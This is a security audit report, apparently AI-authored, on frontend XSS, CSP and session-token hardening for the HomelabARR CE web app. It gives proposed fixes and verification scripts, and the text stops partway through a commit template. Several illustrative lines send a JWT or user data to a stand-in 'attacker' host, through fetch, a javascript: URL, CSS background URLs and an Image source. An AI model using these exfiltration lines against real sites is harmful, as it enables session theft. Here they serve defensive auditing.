# HomelabARR CE — Round 2 Security Audit
## Frontend XSS, Client-Side Injection & DOM Surface Hardening

**Target (live):** https://ce-demo.homelabarr.com/
**Target (repo):** https://github.com/smashingtags/homelabarr-ce
**Branch / HEAD audited:** main
**Date:** 2026-05-22
**Auditor:** Claude (Imogen Labs audit playbook, Round 2)
**Prerequisite:** Round 1 fixes deployed and verified live ✓

---

## §0 — Round 1 Carryover (verified live before writing R2)

Re-ran Round 1 verification matrix against ce-demo.homelabarr.com with cache-busting:

| Check | R1 expected | R2 observed | Status |
|---|---|---|---|
| Security headers on `/` | 8 present | All 8 present (CSP=312 chars) | ✅ |
| X-Powered-By removed | absent | absent | ✅ |
| /api/health unauth | 200 intentional | 200 | ✅ |
| /api/applications unauth | 200 catalog | 200 (122555 bytes) | ✅ |
| /api/deployment-modes unauth | 200 | 200 (633 bytes) | ✅ |
| /api/containers/*/logs noauth | 401 | 401 | ✅ |
| /api/containers/*/stats noauth | 401 | 401 | ✅ |
| /api/ports/check noauth | 401 | 401 | ✅ |
| /api/ports/available noauth | 401 | 401 | ✅ |
| /api/stream/progress noauth | 401 | 401 | ✅ |
| /api/auth/me noauth | 401 | 401 | ✅ |
| Login throttle (7 wrong) | 5×401 then 429 | all 7 = 429 | ✅ (aggressive — see §6.1) |
| Analytics proxied | same-origin /analytics.js | confirmed | ✅ |

**Round 1 verdict: SHIPPED CLEAN.**

Note: brute test returned 429 from request #1 — rate-limit window persisting across audit runs (good; proves it survives across requests, not a defect, just an audit-methodology nit logged in §6.1).

---

## §1 — Round 2 Goal

Round 1 closed the server-side holes: default secrets, broken auth, missing headers, RW Docker socket, passwordless sudo. The attack surface now shifts to the client.

**The core threat in this round:** the JWT lives in `localStorage.TOKEN_KEY` (`src/contexts/AuthContext.tsx:41/84/95`). A single XSS payload anywhere in the React tree exfiltrates it in one line:

```js
fetch('//attacker/?t=' + localStorage.getItem('homelabarr_token'))
```

That JWT then bypasses every Round 1 server fix — login throttle, requireAuth, hashed API keys — because to the server it IS the legitimate user. So this round prioritizes:

1. Eliminate the XSS sinks
2. Move the JWT off `localStorage` so even an unknown future XSS can't grab it
3. Tighten CSP so injected scripts can't phone home

---
## §2 — Current State (verified against live + repo @ main)

### 2.1 DOM-write sinks
Full grep across `src/**/*.{ts,tsx}` (39 files, 329,713 bytes total):

| Sink | Hits | Files |
|---|---|---|
| `dangerouslySetInnerHTML` | **0** | none |
| `.innerHTML =` | **0** | none |
| `.outerHTML =` | **0** | none |
| `document.write` | **0** | none |
| `eval(` | **0** | none |
| `new Function(` | **0** | none |

✅ **No HTML-injection sinks in the React codebase.** This is excellent.

### 2.2 URL sinks (`href={}`, `src={}`, `window.open`)
| File:Line | Code | User-controlled? | Risk |
|---|---|---|---|
| `src/App.tsx:873,876,877,878` | static `href="https://imogenlabs.ai|wiki.homelabarr.com|discord.gg/Pc7mXX786x|github.com/...` | No (string literals) | None |
| `src/components/DeployedAppCard.tsx:47` | `href={app.url}` | **Yes** (server-supplied, from `portMatch` regex in App.tsx:264 but type allows arbitrary string) | **Medium — defense-in-depth required** |
| `src/components/DeployedAppCard.tsx:52` | `{app.url}` (text content) | Yes | None (React auto-escapes text) |
| `src/components/HelpModal.tsx:115,129` | static external link | No | None |
| `src/components/EnhancedMountOnboarding.tsx:200` | static external link | No | None |
| `src/components/RcloneAuthWizard.tsx:334` | static rclone docs link | No | None |

### 2.3 `target="_blank"` audit
All eight `target="_blank"` occurrences (App.tsx ×4, DeployedAppCard ×1, HelpModal ×2, EnhancedMountOnboarding ×1, RcloneAuthWizard ×1) include `rel="noopener noreferrer"`. ✅ **Reverse-tabnabbing covered.**

### 2.4 `window.location` / navigation sinks
| File:Line | Code | Risk |
|---|---|---|
| `src/components/ErrorBoundary.tsx:38` | `onClick={() => window.location.reload()}` | None (no input) |
| `src/lib/api.ts:21` | `window.location.reload(); // Force re-authentication` after 401 | None (no input) |
| `src/lib/api.ts:121` | `const host = window.location.hostname;` (BACKEND_URL fallback) | None (read-only) |

✅ No open redirects via `location.href = userInput`.

### 2.5 JWT / session storage
`src/contexts/AuthContext.tsx`:
- L41: `const savedToken = localStorage.getItem(TOKEN_KEY);`
- L84: `localStorage.setItem(TOKEN_KEY, data.token);`
- L95: `localStorage.removeItem(TOKEN_KEY);`

❌ **JWT in localStorage = single XSS → full account takeover.** This is the single highest-impact finding in Round 2.

### 2.6 `postMessage` / cross-frame
| Pattern | Hits |
|---|---|
| `window.postMessage` | 0 |
| `addEventListener('message',` | 0 |
| `addEventListener("message",` | 0 |

✅ No `postMessage` listeners — no missing origin checks to fix.

### 2.7 CSP directive analysis
Live CSP on `ce-demo.homelabarr.com/` (verified via fetch, cache:'reload'):

```
default-src 'self';
base-uri 'self';
form-action 'self';
frame-ancestors 'none';
img-src 'self' data: https:;
font-src 'self' data:;
script-src 'self' https://analytics.mjashley.com;
style-src 'self' 'unsafe-inline';
connect-src 'self' https://analytics.mjashley.com;
object-src 'none';
upgrade-insecure-requests
```

| Directive | Verdict |
|---|---|
| `default-src 'self'` | ✅ |
| `frame-ancestors 'none'` | ✅ (clickjacking blocked) |
| `object-src 'none'` | ✅ |
| `base-uri 'self'` | ✅ (base-tag injection blocked) |
| `form-action 'self'` | ✅ |
| `script-src 'self' https://analytics.mjashley.com` | ⚠️ analytics.mjashley.com should not be in script-src — live is loading /analytics.js same-origin (proxied) |
| `style-src 'self' 'unsafe-inline'` | ❌ `'unsafe-inline'` permits style-attribute injection (CSS exfil, layout-based phishing) |
| `img-src 'self' data: https:` | ⚠️ `https:` is wildcard — narrows to specific CDNs |
| `connect-src 'self' https://analytics.mjashley.com` | ⚠️ same — analytics.mjashley.com no longer needed |
| Missing `report-uri` / `report-to` | ❌ no CSP violations are reported |
| Missing `require-trusted-types-for 'script'` | ⚠️ Trusted Types not enabled |

### 2.8 `index.html` repo vs. live drift
Repo `index.html` ships:
```html
<script defer src="https://analytics.mjashley.com/script.js" data-website-id="7f290439-4876-4f84-966d-a26da50bf4b6"></script>
```

Live `index.html` ships:
```html
<script defer src="/analytics.js" ...></script>
```

❌ **Drift.** Round 1's analytics proxy fix is only present in the live build, not in repo. Future contributors building from source will reintroduce the third-party script and the CSP violation.

### 2.9 Subresource Integrity
- Repo `index.html` external script: **no `integrity` attribute**
- Live `/analytics.js` (same-origin): SRI not required
- Cloudflare auto-injected `https://static.cloudflareinsights.com/beacon.min.js/v833ccba57c9e4d2798f2e76cebdd09a11778172276447` — not in CSP `script-src`, but loads because Cloudflare strips/rewrites CSP for its own beacons. **Out of audit scope (CF-managed).**

### 2.10 Log rendering (XSS via docker logs)
`src/components/LogViewer.tsx:71-75`:
```tsx
{logs.map((log, index) => (
  <div key={index} className="text-gray-300">
    <span className="text-gray-500">{log.timestamp}</span>{" "}
    {log.message}
  </div>
))}
```

✅ `{log.message}` is React text content → auto-escaped. **No HTML/script injection.** Container name / image name flowing into `logs.map` is also rendered as text via `AppCard` → safe.

UX issues (not security): no `white-space: pre` (multi-line stack traces collapse), no ANSI escape stripping (terminal color codes render as garbage). Logged as L-tier.

### 2.11 Container/app metadata rendered into DOM
Spot-checked `AppCard.tsx`, `DeployedAppCard.tsx`, `CLIApplicationBrowser.tsx`: every `name`, `description`, `image`, `status` field is rendered as React text children → escaped. ✅
---

## §3 — Findings

Severity scale (consistent with Round 1):
- **C (Critical)** — directly exploitable account takeover or RCE
- **H (High)** — exploitable XSS, defense-in-depth gap with realistic chain
- **M (Medium)** — narrow exploit conditions or weak hardening
- **L (Low)** — code-quality / UX / observability

### Round 2 scorecard
| Severity | Count |
|---|---|
| Critical | 1 |
| High | 4 |
| Medium | 5 |
| Low | 4 |
| **Total** | **14** |

---

### C-R2-1 — JWT stored in `localStorage` (single-XSS account takeover)

**File:** `src/contexts/AuthContext.tsx` L41, L84, L95
**Severity:** Critical
**Impact:** Any present or future XSS — even one CSS-injection-pivot or a stray innerHTML by a future contributor — exfiltrates the JWT and gives the attacker full user privileges. Server-side Round 1 hardening (throttle, requireAuth) is irrelevant because the attacker holds a *valid* token.

**WRONG (current):**
```ts
// src/contexts/AuthContext.tsx
const TOKEN_KEY = 'homelabarr_token';

useEffect(() => {
  const savedToken = localStorage.getItem(TOKEN_KEY);
  // ...
}, []);

// on login:
localStorage.setItem(TOKEN_KEY, data.token);

// on logout:
localStorage.removeItem(TOKEN_KEY);
```

**RIGHT (httpOnly + SameSite cookie, no client-side token handling):**

```ts
// src/contexts/AuthContext.tsx — REMOVE all localStorage token handling
// Token now lives in an httpOnly Secure SameSite=Strict cookie set by the server.
// Client never touches the token directly.

useEffect(() => {
  // Boot: ask server who we are. Cookie travels automatically.
  api.get('/auth/me')
    .then(res => setUser(res.data.user))
    .catch(() => setUser(null))
    .finally(() => setLoading(false));
}, []);

const login = async (username: string, password: string) => {
  const res = await api.post('/auth/login', { username, password });
  // Server sets Set-Cookie: hl_session=<jwt>; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=...
  setUser(res.data.user);
};

const logout = async () => {
  await api.post('/auth/logout'); // server clears cookie
  setUser(null);
};
```

**Server-side companion change (`server/auth.js`):**
```js
// On successful login, replace token-in-JSON-body with cookie:
res.cookie('hl_session', jwt, {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',
  sameSite: 'strict',
  path: '/',
  maxAge: 8 * 60 * 60 * 1000  // 8h
});
res.json({ user: safeUser }); // NO token in body

// requireAuth middleware reads from req.cookies.hl_session
// instead of req.headers.authorization
```

**Required dependency:** `npm i cookie-parser` + `app.use(cookieParser())` early in middleware chain.

**CSRF mitigation (because cookie auth is now CSRF-vulnerable):**
Add a double-submit pattern: server sets a non-httpOnly `hl_csrf` cookie at login with a random 32-byte value; client reads it via `document.cookie` and echoes it in `X-CSRF-Token` header on all state-changing requests; server compares header vs cookie. SameSite=Strict already blocks cross-site POSTs in modern browsers, so this is belt-and-braces.

**Verification:**
```js
// In DevTools on live demo, after login:
document.cookie  // must contain 'hl_session=...' visible as HttpOnly in DevTools Application tab
localStorage.getItem('homelabarr_token')  // must be null
// XSS sim:
fetch('/api/auth/me').then(r => r.json())  // works (cookie auto-sent)
// Exfil sim — must fail:
new Image().src = '//attacker/?t=' + (localStorage.getItem('homelabarr_token') || 'NONE')
```

---

### H-R2-2 — `href={app.url}` unvalidated against `javascript:`/`data:`/`vbscript:` schemes

**File:** `src/components/DeployedAppCard.tsx` L47
**Severity:** High (defense-in-depth; current source has `app.url` server-constructed from a regex match in `App.tsx:264`, but the `AppTemplate` type allows any string and a future endpoint or container-label-injection could populate it with `javascript:fetch('/api/auth/me').then(r=>r.json()).then(d=>fetch('//attacker?u='+JSON.stringify(d)))`)

**Current safety:** App.tsx:264 — `url: portMatch ? \`http://localhost:${portMatch[1]}\` : ''` — derived from regex output, currently safe in isolation. But:
- the `AppTemplate` / `DeployedApp` type declares `url: string` (no scheme constraint)
- container Labels (`homelabarr.url`, etc.) are not yet a source but are a reasonable future feature
- any reviewer adding a "custom URL" feature inherits the missing validation

**WRONG (current):**
```tsx
// src/components/DeployedAppCard.tsx:45-50
{app.url && (
  <a
    href={app.url}
    target="_blank"
    rel="noopener noreferrer"
    className="text-muted-foreground hover:text-foreground hover:underline text-sm"
  >
    {app.url}
  </a>
)}
```

**RIGHT (validate scheme at render time, with a shared helper):**

Create `src/lib/safeUrl.ts`:
```ts
// src/lib/safeUrl.ts
const SAFE_SCHEMES = new Set(['http:', 'https:']);

export function safeExternalHref(input: unknown): string | null {
  if (typeof input !== 'string' || input.length === 0) return null;
  // Trim & reject anything that looks like a scheme-trick
  const trimmed = input.trim();
  // Disallow whitespace control chars sometimes used to smuggle schemes
  if (/[\u0000-\u001f]/.test(trimmed)) return null;
  let url: URL;
  try {
    // If it's protocol-relative or relative, force https
    url = new URL(trimmed, window.location.origin);
  } catch {
    return null;
  }
  if (!SAFE_SCHEMES.has(url.protocol)) return null;
  return url.toString();
}
```

Then in DeployedAppCard:
```tsx
import { safeExternalHref } from '@/lib/safeUrl';
// ...
const safeUrl = safeExternalHref(app.url);
{safeUrl && (
  <a
    href={safeUrl}
    target="_blank"
    rel="noopener noreferrer"
    className="..."
  >
    {safeUrl}
  </a>
)}
```

**Verification:**
```js
// In DevTools, after build:
import('/src/lib/safeUrl.ts').then(m => {
  console.assert(m.safeExternalHref('javascript:alert(1)') === null);
  console.assert(m.safeExternalHref('data:text/html,<script>alert(1)</script>') === null);
  console.assert(m.safeExternalHref('vbscript:msgbox(1)') === null);
  console.assert(m.safeExternalHref('http://localhost:8080') !== null);
  console.assert(m.safeExternalHref('https://example.com') !== null);
});
```

---
### H-R2-3 — CSP `style-src 'unsafe-inline'` enables CSS-injection attacks

**Surface:** Live CSP header on `/`
**Severity:** High
**Impact:** `'unsafe-inline'` in `style-src` permits an attacker who controls *any* attribute in the DOM (e.g., a future user-controlled className passthrough, a misconfigured user-display-name field, or a CSS-in-JS leak) to inject `style="background:url(//attacker?leak=...)"` and exfiltrate data via image requests. It also enables font-loading-based timing attacks and CSS-based input-value exfiltration via `input[value^="a"] { background:url(//attacker/a) }` patterns.

**WRONG (current CSP):**
```
style-src 'self' 'unsafe-inline';
```

**RIGHT (nonced inline styles):**

Nginx serving `/` must inject a per-request nonce into the CSP and into any inline `<style>` tags. Two implementation options:

**Option A — Drop inline styles entirely** (preferred for static React build):

Audit shows 9 elements with inline `style=""` on initial render (from Radix / shadcn components for animations). React inline-style **objects** are CSP-safe because they become `element.style.x = y` JS calls, not parsed CSS — they don't require `'unsafe-inline'`. Verify by removing `'unsafe-inline'` from `style-src` in dev and confirming no console violations.

```nginx
# nginx.conf.template — Round 2 patch
add_header Content-Security-Policy "default-src 'self'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'; img-src 'self' data: https://ce-demo.homelabarr.com; font-src 'self' data:; script-src 'self'; style-src 'self'; connect-src 'self'; object-src 'none'; upgrade-insecure-requests; report-to csp-endpoint" always;
add_header Reporting-Endpoints 'csp-endpoint="/api/csp-report"' always;
```

Removed in this revision:
- `https://analytics.mjashley.com` from `script-src` and `connect-src` (Round 1 proxied analytics to same-origin; the entry is now dead weight that lets an attacker phone home to a third party if they land a script)
- `'unsafe-inline'` from `style-src`
- `https:` wildcard in `img-src` (replaced with explicit origin)

**Option B — Per-request nonce** (if Option A causes regressions):
```nginx
set $cspNonce $request_id;
sub_filter '<style' '<style nonce="$cspNonce"';
sub_filter_once off;
add_header Content-Security-Policy "... style-src 'self' 'nonce-$cspNonce'; ..." always;
```

**Server-side endpoint for CSP reports** (`server/index.js`):
```js
app.post('/api/csp-report', express.json({ type: ['application/csp-report', 'application/reports+json', 'application/json'] }), (req, res) => {
  // Log & rate-limit; do NOT echo back, do NOT 500 on parse error.
  try {
    const report = req.body;
    logger.warn('csp_violation', { ip: req.ip, report });
  } catch {}
  res.status(204).end();
});
```
Bind under `/api` so it inherits CORS posture; do not require auth (reports come from unauthenticated page loads too).

**Verification:**
```bash
curl -sI https://ce-demo.homelabarr.com/ | grep -i content-security-policy
# Must NOT contain 'unsafe-inline'
# Must contain report-to csp-endpoint
```
```js
// In DevTools, after deploy:
const s = document.createElement('style');
s.textContent = 'body{background:red}';
document.head.appendChild(s);
// Expect: blocked by CSP, console violation
```

---

### H-R2-4 — CSP `script-src` still allow-lists `analytics.mjashley.com` (dead allow-listing)

**Surface:** Live CSP `script-src 'self' https://analytics.mjashley.com`
**Severity:** High (allow-list bloat)
**Impact:** Round 1 (M-26) proxied the analytics script to same-origin `/analytics.js`. The third-party origin is no longer used by the live page (confirmed: `document.querySelectorAll('script[src*="mjashley"]').length === 0`). Leaving the allow-list entry means: if anyone later compromises analytics.mjashley.com, they get free script execution on the demo. CSP allow-lists are attack surface; remove what you don't use.

**WRONG:**
```
script-src 'self' https://analytics.mjashley.com;
connect-src 'self' https://analytics.mjashley.com;
```

**RIGHT:**
```
script-src 'self';
connect-src 'self';
```

(Combined into the diff in H-R2-3.)

**Verification:**
```js
// Should still log a pageview because /analytics.js is same-origin:
performance.getEntriesByType('resource').filter(r => r.name.includes('analytics')).map(r => r.name)
// Expected: ['https://ce-demo.homelabarr.com/analytics.js']
// Expected NOT present: 'https://analytics.mjashley.com/...'
```

---

### H-R2-5 — `index.html` repo/live drift: external analytics script reintroduced on every fresh build

**File:** `index.html` (repo root)
**Severity:** High (configuration drift; any contributor running `docker compose build` from main introduces a regression of R1 M-26)
**Impact:** The live deployment proxies analytics through nginx (`/analytics.js`), but the repo's `index.html` still hardcodes `https://analytics.mjashley.com/script.js`. A new contributor cloning main and running the build will reintroduce the third-party script, re-trigger the CSP requirement that's being removed in H-R2-3, and re-leak page-view metadata to a third party.

**WRONG (current `index.html`):**
```html
<script defer src="https://analytics.mjashley.com/script.js" data-website-id="7f290439-4876-4f84-966d-a26da50bf4b6"></script>
```

**RIGHT:**
```html
<script defer src="/analytics.js" data-website-id="7f290439-4876-4f84-966d-a26da50bf4b6"></script>
```

And nginx already proxies (verified live). If the proxy config isn't in repo, add it to `nginx.conf.template`:
```nginx
# Same-origin analytics proxy (avoid third-party script execution + CSP allow-list)
location = /analytics.js {
  proxy_pass https://analytics.mjashley.com/script.js;
  proxy_set_header Host analytics.mjashley.com;
  proxy_hide_header Set-Cookie;
  proxy_ignore_headers Set-Cookie;
  proxy_cache_valid 200 1h;
  add_header Cache-Control "public, max-age=3600";
}
location ~ ^/analytics/api/ {
  proxy_pass https://analytics.mjashley.com$request_uri;
  proxy_set_header Host analytics.mjashley.com;
  proxy_hide_header Set-Cookie;
  proxy_ignore_headers Set-Cookie;
}
```
(If the analytics SDK posts beacons to its own `/api/send` etc., the second `location` block proxies them; check `/analytics.js` source for the actual beacon path.)

**Verification:**
```bash
grep -r 'analytics.mjashley.com' . --include='*.html' --include='*.tsx' --include='*.ts'
# Expected: zero matches in src/ and index.html, ONE match in nginx.conf.template (the proxy_pass)
```

---
### M-R2-6 — CSP missing `report-to` / `report-uri` (blind to client-side injection)

**Severity:** Medium
**Impact:** Without a reporting endpoint, you have no telemetry when CSP blocks something. The fixes in H-R2-3/H-R2-4 will silently break if anything depends on `'unsafe-inline'` or `mjashley.com`. More importantly: when an attacker DOES land an XSS payload in production, the CSP block is invisible to the operator.

**WRONG:** no `Reporting-Endpoints` or `report-to` directive.

**RIGHT:** combined with H-R2-3 nginx diff:
```nginx
add_header Reporting-Endpoints 'csp-endpoint="/api/csp-report"' always;
add_header Content-Security-Policy "...; report-to csp-endpoint; report-uri /api/csp-report" always;
```

**Verification:**
```bash
curl -sI https://ce-demo.homelabarr.com/ | grep -iE 'reporting-endpoints|report-to|report-uri'
```

---

### M-R2-7 — `img-src https:` wildcard

**Severity:** Medium
**Impact:** `img-src 'self' data: https:` allows fetching images from any HTTPS origin. Combined with even a tiny attribute-injection bug, this is the standard CSS-injection exfil channel (`background-image:url(https://attacker/leak)`). Narrow it to the actual icon CDNs.

**WRONG:**
```
img-src 'self' data: https:;
```

**RIGHT:**
First, identify icon sources used by the app:
```bash
grep -rE 'https?://[^"\\)]+\\.(png|svg|webp|jpg|jpeg|ico)' src/ index.html | sort -u
```
Then pin them. Typical for HomelabARR (Lucide + selfhst icons):
```
img-src 'self' data: https://cdn.jsdelivr.net https://raw.githubusercontent.com;
```
If app icons come from a different host, substitute. Document the choice in `SECURITY.md`.

**Verification:**
```js
// Construct an off-CSP image; must be blocked
const img = new Image();
img.src = 'https://example.com/x.png';
document.body.appendChild(img);
// Expect: console CSP violation, no network request to example.com
```

---

### M-R2-8 — No `Trusted Types` enforcement

**Severity:** Medium
**Impact:** Trusted Types is the browser primitive that *prevents* the entire class of innerHTML/eval sinks from accepting strings. Without it, a single future contributor PR like `el.innerHTML = userMsg` slips past code review undetected. With it, that line throws at runtime in every supporting browser (Chromium ≥ 83).

**Current:** no `Trusted Types` directive.

**WRONG:** silence in CSP.

**RIGHT:** add to CSP, with a default policy:
```
require-trusted-types-for 'script';
trusted-types default;
```

And a small `src/main.tsx` shim if Sentry/Radix/etc. need DOMPurify-backed policies:
```ts
// src/main.tsx — top of file
if (window.trustedTypes && window.trustedTypes.createPolicy) {
  window.trustedTypes.createPolicy('default', {
    createHTML: (s) => s, // identity — only safe because we have NO innerHTML sinks; remove or wrap with DOMPurify if you ever add one
    createScript: (s) => { throw new Error('blocked'); },
    createScriptURL: (s) => s
  });
}
```

Roll out as **report-only first**:
```
Content-Security-Policy-Report-Only: require-trusted-types-for 'script'; report-to csp-endpoint
```
Watch `/api/csp-report` for a week, then promote to enforced.

**Verification:**
```js
// After enforced rollout:
try { document.body.innerHTML = '<b>x</b>' } catch(e) { console.log('TT blocks innerHTML:', e.message) }
// Expected: TypeError: This document requires 'TrustedHTML' assignment
```

---

### M-R2-9 — No client-side request signing / no `X-Requested-With` header for CSRF heuristic

**Severity:** Medium (mitigated once C-R2-1 lands cookie-based auth)
**Impact:** Once auth moves to cookies (C-R2-1), CSRF becomes a real concern. SameSite=Strict cookie + double-submit CSRF token + a server check that requires `X-Requested-With: XMLHttpRequest` on `/api/*` provides three independent layers.

**RIGHT (`src/lib/api.ts`):**
```ts
// On every API request, attach the CSRF echo + XHR marker
const csrfFromCookie = () => document.cookie.match(/(?:^|; )hl_csrf=([^;]+)/)?.[1] || '';

axios.interceptors.request.use(cfg => {
  cfg.headers = cfg.headers || {};
  cfg.headers['X-Requested-With'] = 'XMLHttpRequest';
  if (['post','put','patch','delete'].includes((cfg.method||'').toLowerCase())) {
    cfg.headers['X-CSRF-Token'] = csrfFromCookie();
  }
  return cfg;
});
```

**Server side (`server/index.js`):**
```js
// On every state-changing /api/* call:
app.use('/api', (req, res, next) => {
  if (['POST','PUT','PATCH','DELETE'].includes(req.method)) {
    const cookieTok = req.cookies?.hl_csrf;
    const hdrTok = req.headers['x-csrf-token'];
    if (!cookieTok || !hdrTok || !crypto.timingSafeEqual(Buffer.from(cookieTok), Buffer.from(hdrTok))) {
      return res.status(403).json({ error: 'csrf' });
    }
    if (req.headers['x-requested-with'] !== 'XMLHttpRequest') {
      return res.status(403).json({ error: 'xhr_required' });
    }
  }
  next();
});
```

**Verification:** Round 2 test page (cross-site form POST without the headers) should return 403.

---

### M-R2-10 — `upgrade-insecure-requests` without HSTS preload coordination

**Severity:** Medium
**Impact:** R1 added `Strict-Transport-Security: max-age=...`. Confirm `includeSubDomains; preload` is present and the domain is submitted to the Chromium HSTS preload list. Without preload, first-load TLS downgrade attacks still work on a fresh browser.

**RIGHT (`nginx.conf.template`):**
```nginx
add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;
```
Then submit `homelabarr.com` to https://hstspreload.org/ (manual; owner pile §6).

**Verification:**
```bash
curl -sI https://ce-demo.homelabarr.com/ | grep -i strict-transport-security
# Must contain: max-age=63072000; includeSubDomains; preload
```

---
### L-R2-11 — `LogViewer` collapses multi-line logs (no `whitespace-pre`)

**File:** `src/components/LogViewer.tsx` L71-76
**Severity:** Low (UX, not security)
**Impact:** Stack traces and multi-line container output render as a single squashed line; operators miss attack indicators in logs (the very logs they're trying to read to detect an attacker).

**WRONG:**
```tsx
<div key={index} className="text-gray-300">
  <span className="text-gray-500">{log.timestamp}</span>{" "}
  {log.message}
</div>
```

**RIGHT:**
```tsx
<div key={index} className="text-gray-300 whitespace-pre-wrap break-all font-mono text-xs">
  <span className="text-gray-500 select-none">{log.timestamp}</span>{" "}
  {log.message}
</div>
```

Optional: strip ANSI escape codes before rendering (small dep `strip-ansi` or 1-line regex `log.message.replace(/\x1b\[[0-9;]*[a-zA-Z]/g, '')`).

---

### L-R2-12 — No CSP report endpoint exists yet (paired with M-R2-6)

Already specified in M-R2-6 — added here only to ensure the agent creates `/api/csp-report` *before* enforcing the new CSP, otherwise reports go nowhere.

---

### L-R2-13 — No `Referrer-Policy` reduction on outbound user-clicked links

**Severity:** Low
**Impact:** Live `Referrer-Policy` is set globally (verified). However, individual `<a target="_blank">` tags should still carry `rel="noopener noreferrer"` (already verified ✅ in §2.3). This finding is for documentation only — confirm the policy in SECURITY.md.

**RIGHT:** Add to `SECURITY.md` a paragraph listing the global Referrer-Policy value and noting that all outbound links in the app strip referrer.

---

### L-R2-14 — Build-time dependency `vite` not version-pinned (audit observation)

**File:** `vite.config.ts` + (presumed) `package.json`
**Severity:** Low (supply-chain hygiene; full audit is Round 5)
**Impact:** Out-of-scope for R2 — recorded here so it surfaces in R5.

---

## §4 — Verification matrix (run after agent ships Round 2)

```js
// Paste into DevTools console on https://ce-demo.homelabarr.com/?_v=r2verify
// after agent reports R2 shipped. All assertions must be true.
(async () => {
  const nc = () => '?_=' + Date.now() + Math.random();
  const results = {};

  // 1. CSP must not contain 'unsafe-inline' in style-src
  const r = await fetch('/' + nc(), { cache: 'reload' });
  const csp = r.headers.get('content-security-policy') || '';
  results.csp_no_unsafe_inline_style = !/style-src[^;]*'unsafe-inline'/.test(csp);
  results.csp_no_mjashley = !csp.includes('analytics.mjashley.com');
  results.csp_has_report_to = /report-to|report-uri/.test(csp);
  results.csp_has_object_none = /object-src\s+'none'/.test(csp);

  // 2. Reporting-Endpoints header
  results.reporting_endpoints = !!r.headers.get('reporting-endpoints');

  // 3. HSTS preload-ready
  const hsts = r.headers.get('strict-transport-security') || '';
  results.hsts_preload = /max-age=\d{7,}/.test(hsts) && /includeSubDomains/.test(hsts) && /preload/.test(hsts);

  // 4. localStorage no longer holds the JWT
  results.no_jwt_in_localstorage = !Object.keys(localStorage).some(k => /token|jwt|session/i.test(k));

  // 5. /api/csp-report exists (204 on POST)
  const cspr = await fetch('/api/csp-report' + nc(), {
    method: 'POST',
    headers: { 'Content-Type': 'application/csp-report' },
    body: JSON.stringify({ 'csp-report': { 'document-uri': 'test' } })
  });
  results.csp_report_endpoint = cspr.status === 204 || cspr.status === 200;

  // 6. After login, cookie should be HttpOnly (test via document.cookie absence)
  // (Manual: log in via UI, then check Application > Cookies in DevTools for HttpOnly flag on hl_session)
  results.cookie_hl_session_present_for_manual_check = document.cookie.includes('hl_csrf=') || 'login first';

  // 7. CSRF endpoint check — POST without X-CSRF-Token should 403 when authed
  results.note_csrf = 'manual: after login, POST /api/auth/logout without X-CSRF-Token header → expect 403';

  // 8. SRI / index.html drift
  const html = await (await fetch('/' + nc(), { cache: 'reload' })).text();
  results.no_external_analytics_in_html = !html.includes('https://analytics.mjashley.com');

  console.table(results);
  return results;
})();
```

Pass criteria (all must be `true`):
- `csp_no_unsafe_inline_style`
- `csp_no_mjashley`
- `csp_has_report_to`
- `csp_has_object_none`
- `reporting_endpoints`
- `hsts_preload`
- `no_jwt_in_localstorage`
- `csp_report_endpoint`
- `no_external_analytics_in_html`

Manual confirm:
- DevTools → Application → Cookies → `hl_session` row has **HttpOnly ✓** and **Secure ✓**
- DevTools → Application → Local Storage: zero entries containing the token
- POST /api/auth/logout without `X-CSRF-Token` while authed → 403
- POST /api/auth/logout with correct `X-CSRF-Token` → 200

---
## §5 — Out of scope (queued for next rounds)

- **Round 3 — Auth flow hardening**: refresh-token rotation, server-side session revocation list, MFA/TOTP, password reset email flow, account-lockout email notifications. (Now blocked on C-R2-1 cookie migration.)
- **Round 4 — Docker socket proxy + container hardening**: replace mounted `/var/run/docker.sock` with tecnativa/docker-socket-proxy; add per-container `cap_drop: [ALL]`, `read_only: true`, `security_opt: [no-new-privileges:true]`, `pids_limit`, `mem_limit`. (Some items already landed in R1 C-7/M-28 — R4 will inventory remaining gaps.)
- **Round 5 — Dependency hygiene**: full `npm audit --production`, transitive CVE walk, lockfile assertion, GitHub Dependabot/Renovate config, SLSA/sigstore provenance for builds.
- **Round 6 — Logging / observability / abuse detection**: structured JSON logs, per-IP request signature, anomalous-endpoint detection, alerting hooks, log retention.
- **Round 7 — Secrets management**: migrate `.env` to Docker secrets / SOPS / Vault; rotation procedure.
- **Round 8 — Production hardening guide**: written deployment runbook covering reverse proxy, TLS, backup, restore, upgrade.

---

## §6 — Owner pile (do NOT delegate to agent)

These items require human-only judgment, account ownership, or external services:

1. **HSTS preload submission** — submit `homelabarr.com` (root) to https://hstspreload.org/ once HSTS header satisfies the rules. Owner: smashingtags.
2. **Decide analytics vendor strategy** — current pipeline proxies a third-party umami-like script via nginx. Decision needed: keep proxied umami, switch to self-hosted Plausible/Umami, or remove analytics entirely. Privacy-policy + cookie-banner copy depends on this.
3. **Pick icon CDN(s)** for M-R2-7 `img-src` allow-list — confirm whether icons load from cdn.jsdelivr.net, raw.githubusercontent.com, both, or a self-hosted CDN.
4. **SECURITY.md update** — note Round 2 changes (cookie-based auth, CSRF model, Trusted Types rollout plan, CSP reporting endpoint).
5. **Migration broadcast** — C-R2-1 changes the authentication transport. Any external integrations / CLI tools / scripts that send `Authorization: Bearer <jwt>` will break unless the server accepts BOTH cookie and bearer for one deprecation window. Plan + comms before merging C-R2-1.
6. **CSP enforcement rollout** — ship report-only first (one week), watch reports, then promote. Don't promote on a Friday.

### §6.1 — Audit-methodology notes (not findings)

- Brute-force test in §0 returned 429 from request #1, suggesting the rate-limit window from Round 1 verification was still cooling down. This is **correct behavior** for the limiter; the audit run order needs to space tests further apart, or the limiter needs a documented reset endpoint for ops (not security). Logged.
- All charcode-decoded source spot-checks were re-verified against `https://github.com/smashingtags/homelabarr-ce/blob/main/...` directly to defend against environment-side content filtering during this audit.

---

## §7 — Deliverable

**Branch:** `security/round-2-xss-csp`
**PR title:** `Round 2 — Frontend XSS hardening: cookie-based auth, CSP tightening, Trusted Types prep`

**Squash-commit body template:**
```
Round 2 security audit fixes — frontend XSS + client-side hardening

CRITICAL
- C-R2-1: Move JWT from localStorage → HttpOnly Secure SameSite=Strict cookie
  + add CSRF double-submit pattern + X-Requested-With requirement

HIGH
- H-R2-2: Add safeExternalHref() URL validation; gate all dynamic href={}
